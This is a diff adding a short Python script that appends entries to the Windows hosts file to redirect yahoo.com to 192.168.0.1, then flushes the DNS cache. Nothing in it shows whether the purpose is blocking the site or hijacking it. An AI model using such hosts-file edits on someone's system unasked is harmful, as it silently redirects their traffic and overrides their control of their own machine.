@@ -1,1 +1,19 @@
-#
+import time
+import subprocess
+
+# Run the command "ECHO 192.168.0.1 www.yahoo.com >> C:\Windows\system32\drivers\etc\hosts"
+subprocess.run('echo 192.168.0.1 www.yahoo.com >> C:\\Windows\\system32\\drivers\\etc\\hosts', shell=True)
+
+time.sleep(0.2)
+
+# Run the command "ECHO 192.168.0.1 yahoo.com >> C:\Windows\system32\drivers\etc\hosts"
+subprocess.run('echo 192.168.0.1 yahoo.com >> C:\\Windows\\system32\\drivers\\etc\\hosts', shell=True)
+
+
+# Run the command "ipconfig /flushdns"
+subprocess.run('ipconfig /flushdns', shell=True)
+
+time.sleep(0.2)
+
+# Run the command "exit"
+subprocess.run('exit', shell=True)
